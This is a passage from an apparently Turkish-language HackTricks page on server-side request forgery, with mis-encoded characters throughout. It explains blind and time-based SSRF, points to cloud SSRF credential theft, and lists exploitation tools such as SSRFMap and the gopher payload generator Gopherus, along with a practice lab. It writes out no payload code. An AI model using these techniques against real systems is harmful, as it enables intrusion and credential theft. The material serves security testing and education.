Bu saldÄ±rÄ±nÄ±n aÃ§Ä±klandÄ±ÄŸÄ± sunumu incelemek iÃ§in daha fazla bilgi iÃ§in: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab\_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo\&ab\_channel=DEFCONConference)

## KÃ¶r SSRF

KÃ¶r SSRF ve kÃ¶r olmayan SSRF arasÄ±ndaki fark, kÃ¶rde SSRF isteÄŸinin yanÄ±tÄ±nÄ± gÃ¶rememenizdir. Bu nedenle, yalnÄ±zca bilinen gÃ¼venlik aÃ§Ä±klarÄ±nÄ± sÃ¶mÃ¼rebileceÄŸiniz iÃ§in daha zor sÃ¶mÃ¼rÃ¼lebilir.

### Zaman tabanlÄ± SSRF

Sunucudan gelen yanÄ±tlarÄ±n **zamanÄ±nÄ± kontrol ederek**, bir kaynaÄŸÄ±n var olup olmadÄ±ÄŸÄ±nÄ± **anlamak mÃ¼mkÃ¼n olabilir** (var olan bir kaynaÄŸa eriÅŸmek, var olmayan bir kaynaÄŸa eriÅŸmekten daha uzun sÃ¼rebilir)

## Bulut SSRF SÃ¶mÃ¼rÃ¼sÃ¼

Bir bulut ortamÄ±nda Ã§alÄ±ÅŸan bir makinede SSRF zafiyeti bulursanÄ±z, bulut ortamÄ± hakkÄ±nda ilginÃ§ bilgiler ve hatta kimlik bilgileri elde edebilirsiniz:

{% content-ref url="cloud-ssrf.md" %}
[cloud-ssrf.md](cloud-ssrf.md)
{% endcontent-ref %}

## SSRF Zafiyetli Platformlar

BirÃ§ok bilinen platform SSRF zafiyetleri iÃ§erir veya iÃ§ermiÅŸtir, bunlarÄ± kontrol edin:

{% content-ref url="ssrf-vulnerable-platforms.md" %}
[ssrf-vulnerable-platforms.md](ssrf-vulnerable-platforms.md)
{% endcontent-ref %}

## AraÃ§lar

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

SSRF zafiyetlerini tespit etmek ve sÃ¶mÃ¼rmek iÃ§in kullanÄ±lan bir araÃ§

### [Gopherus](https://github.com/tarunkant/Gopherus)

* [Gopherus hakkÄ±nda blog yazÄ±sÄ±](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Bu araÃ§, aÅŸaÄŸÄ±daki iÃ§in Gopher yÃ¼kleri oluÅŸturur:

* MySQL
* PostgreSQL
* FastCGI
* Redis
* Zabbix
* Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

* [SSRF kullanÄ±mÄ± hakkÄ±nda blog yazÄ±sÄ±](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_, en yaygÄ±n Java RMI zafiyetleri iÃ§in saldÄ±rÄ± iÅŸlemlerini destekleyen bir Java RMI zafiyet tarama aracÄ±dÄ±r. Mevcut iÅŸlemlerin Ã§oÄŸu, talep edilen iÅŸlem iÃ§in bir _SSRF_ yÃ¼kÃ¼ oluÅŸturmak iÃ§in `--ssrf` seÃ§eneÄŸini destekler. `--gopher` seÃ§eneÄŸiyle birlikte, hazÄ±r kullanÄ±ma uygun _gopher_ yÃ¼kleri doÄŸrudan oluÅŸturulabilir.

### [SSRF Proxy](https://github.com/bcoles/ssrf\_proxy)

SSRF'ye duyarlÄ± HTTP sunucularÄ± Ã¼zerinden istemci HTTP trafiÄŸini tÃ¼nellemek iÃ§in tasarlanmÄ±ÅŸ Ã§oklu iÅŸ parÃ§acÄ±klÄ± bir HTTP proxy sunucusudur.

### Uygulama yapmak iÃ§in

{% embed url="https://github.com/incredibleindishell/SSRF_Vulnerable_Lab" %}

## Referanslar

* [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
* [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</
